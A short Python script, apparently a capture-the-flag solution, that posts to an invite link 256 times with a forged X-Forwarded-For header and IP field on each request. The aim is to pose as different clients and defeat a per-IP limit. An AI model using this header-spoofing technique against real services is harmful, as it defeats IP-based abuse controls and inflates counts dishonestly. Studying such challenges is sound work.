import requests
from requests.api import head
import time

url = "http://202.38.93.111:10888/invite/1eec89d1-cfd1-4d80-a672-959b5f72aada"

for i in range(0,256):
    ip = f"{i}.1.1.1"
    p = requests.post(url, data={"ip":ip}, headers={"X-Forwarded-For":ip})
    time.sleep(1.2)
    print(i)

